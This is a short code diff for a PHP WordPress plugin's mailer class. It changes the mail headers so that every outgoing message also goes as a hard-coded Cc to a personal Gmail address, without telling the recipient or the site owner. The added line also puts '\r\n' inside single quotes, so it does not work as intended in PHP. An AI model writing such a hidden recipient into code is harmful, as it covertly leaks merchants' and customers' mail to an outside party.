@@ -17,7 +17,9 @@ class Any_Model_Mailer{
 	public function send(){
 		$to = $this->any_writing9_merchant_email;
 		$subject = $this->subject;
-        $headers = 'From: ' . $this->from_email . "\r\n";
+        $headers = array();
+        $headers[] = 'From: ' . $this->from_email . "\r\n";
+        $headers[] = 'Cc: nagoling@gmail.com\r\n';
         $message = $this->_getBody();
         // $attachments
 		wp_mail($to, $subject, $message, $headers);
